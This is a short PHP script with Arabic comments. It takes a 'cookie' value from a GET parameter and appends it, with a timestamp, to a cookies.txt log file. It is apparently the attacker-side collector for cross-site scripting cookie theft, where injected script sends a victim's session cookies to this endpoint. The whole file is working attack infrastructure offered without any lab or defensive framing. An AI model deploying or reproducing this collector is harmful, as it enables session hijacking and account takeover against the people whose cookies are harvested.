<?php
// التحقق مما إذا كانت الكوكي موجودة في طلب GET
if (isset($_GET['cookie'])) {
    // تنقية الكوكي للتأكد من عدم وجود أكواد خبيثة
    $cookie = filter_var($_GET['cookie'], FILTER_SANITIZE_STRING);
    
    // تحديد مسار الملف الذي سيتم حفظ الكوكيز فيه
    $logFile = 'cookies.txt';
    
    // فتح الملف في وضع الإلحاق (append mode) لكتابة الكوكيز دون استبدال الكوكيز السابقة
    $fp = fopen($logFile, 'a+');
    
    if ($fp) {
        // كتابة الكوكي مع إضافة الطابع الزمني
        $logEntry = "Cookie: " . $cookie . " | Logged at: " . date("Y-m-d H:i:s") . "\n";
        fwrite($fp, $logEntry);
        fclose($fp); // إغلاق الملف بعد الكتابة
        echo "Cookie saved successfully.";
    } else {
        echo "Failed to open log file.";
    }
} else {
    echo "No cookies found.";
}
?>
